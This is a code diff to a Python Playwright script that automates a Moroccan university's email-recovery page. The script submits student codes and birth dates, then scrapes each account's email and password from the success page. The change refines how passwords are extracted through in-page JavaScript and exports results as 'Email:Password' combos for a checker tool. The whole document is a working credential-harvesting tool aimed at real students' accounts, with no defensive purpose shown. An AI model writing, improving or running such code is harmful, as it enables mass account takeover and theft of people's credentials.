@@ -1,6 +1,6 @@
 """
 UMP RECUPMAIL ENGINE — Core verification module for http://recupmail.ump.ma/
-Accurate extraction of both Email and Password from the UMP success page with double reading.
+Accurate extraction of Email and Password, allowing special symbols (like '*') in passwords while strictly blocking warning texts.
 """
 
 import re
@@ -81,48 +81,90 @@ class UMPEngine:
             if not submit_clicked:
                 page.locator('button').first.click()
 
-            # Double verification / reading result step 1 & step 2 with sufficient delay for rendering
+            # Double verification / reading result step 1 & step 2
             page.wait_for_timeout(3500)
-            body_text_1 = page.locator("body").inner_text()
-            page.wait_for_timeout(2000)
-            body_text = page.locator("body").inner_text()
-
-            # Check Errors
-            error_keywords = ["invalide", "incorrect", "الرقم أو تاريخ", "غير صحيح", "veuillez", "erreur"]
-            low_text = body_text.lower()
-            low_text_1 = body_text_1.lower()
-            if any(kw in low_text for kw in error_keywords) or any(kw in low_text_1 for kw in error_keywords):
+            
+            # فحص الأخطاء أولاً من النص العام
+            body_text = page.locator("body").inner_text().lower()
+            error_keywords = ["invalide", "incorrect", "الرقم أو تاريخ", "غير صحيح", "veuillez", "erreur", "aucun"]
+            if any(kw in body_text for kw in error_keywords):
                 result_data["status"] = LoginState.LOGIN_ERROR
                 result_data["detail"] = "Failed: Incorrect Code Massar or DOB (Login Error)"
                 return result_data
 
-            # Extract Email and Password accurately from UMP success page text
-            email_match = re.search(r'([\w\.-]+@[\w\.-]+\.[a-zA-Z]{2,})', body_text)
-            
-            # Extract Password (typically formatted like P120053167@2026 or found below "Mot de passe")
-            extracted_pwd = None
-            pwd_pat = re.search(r'([A-Z][0-9]{9}@[0-9]{4})', body_text)
-            if pwd_pat:
-                extracted_pwd = pwd_pat.group(1)
-            else:
-                lines = body_text.splitlines()
-                for i, line in enumerate(lines):
-                    if "mot de passe" in line.lower() and i + 1 < len(lines):
-                        extracted_pwd = lines[i+1].strip()
-                        break
+            page.wait_for_timeout(1500)
 
-            if not extracted_pwd:
-                extracted_pwd = "UnknownPwd"
+            # استخراج صارم يستهدف الخضراء ويمنع فقط تحذيرات Important
+            extracted_data = page.evaluate("""() => {
+                let email = null;
+                let password = null;
 
-            if email_match or "email" in low_text or "prénom" in low_text:
-                extracted_email = email_match.group(1) if email_match else "Extracted_Email"
-                # Combine both email and password into extracted_email variable so Dynamo exports them together (Email:Password)
+                const isWarningText = (text, el) => {
+                    if (!text) return true;
+                    const lower = text.toLowerCase().trim();
+                    // منع جمل التحذير أو كلمة important وحدها، لكن السماح بالنجمة '*' إيلا كانت ضمن الباسورد
+                    if (lower.includes('important') || lower.includes('vous devez') || lower.includes('mot de passe')) {
+                        return true;
+                    }
+                    if (el && (el.classList.contains('label-danger') || el.closest('.text-danger') || el.closest('.centrePhoneEmail'))) {
+                        return true;
+                    }
+                    return false;
+                };
+
+                // 1. استخراج الإيميل
+                const bodyText = document.body.innerText;
+                const emailMatch = bodyText.match(/[\\w\\.-]+@ump\\.ac\\.ma/i);
+                if (emailMatch) {
+                    email = emailMatch[0].trim().toLowerCase();
+                }
+
+                // 2. استخراج الباسورد حصرياً من البادج الخضراء span.label-success
+                const successSpans = document.querySelectorAll('span.label-success:not(.label-danger)');
+                for (let span of successSpans) {
+                    let val = span.innerText.trim();
+                    if (!isWarningText(val, span) && val.length >= 4) {
+                        password = val;
+                        break;
+                    }
+                }
+
+                // 3. طريقة احتياطية دقيقة داخل الـ Table
+                if (!password) {
+                    const rows = document.querySelectorAll('table tr');
+                    for (let row of rows) {
+                        const th = row.querySelector('th');
+                        const td = row.querySelector('td');
+                        if (th && td && th.innerText.toLowerCase().includes('mot de passe')) {
+                            const spanSuccess = td.querySelector('span.label-success');
+                            let val = spanSuccess ? spanSuccess.innerText.trim() : td.innerText.trim();
+                            if (!isWarningText(val, td) && val.length >= 4) {
+                                password = val;
+                                break;
+                            }
+                        }
+                    }
+                }
+
+                return { email, password };
+            }""")
+
+            extracted_email = extracted_data.get("email")
+            extracted_pwd = extracted_data.get("password")
+
+            # فحص نهائي في بايثون: نمنع فقط كلمة important ونسمح بالرموز العادية
+            if (
+                extracted_email 
+                and extracted_pwd 
+                and "@ump.ac.ma" in extracted_email
+                and "important" not in extracted_pwd.lower()
+            ):
                 result_data["status"] = LoginState.LOGIN_OK
                 result_data["extracted_email"] = f"{extracted_email}:{extracted_pwd}"
                 result_data["detail"] = f"Success | Email: {extracted_email} | Password: {extracted_pwd}"
             else:
                 result_data["status"] = LoginState.LOGIN_ERROR
-                result_data["detail"] = "Failed: Success elements not found"
+                result_data["detail"] = "Failed: Valid password not extracted"
 
         except Exception as e:
             result_data["status"] = LoginState.SITE_ERROR
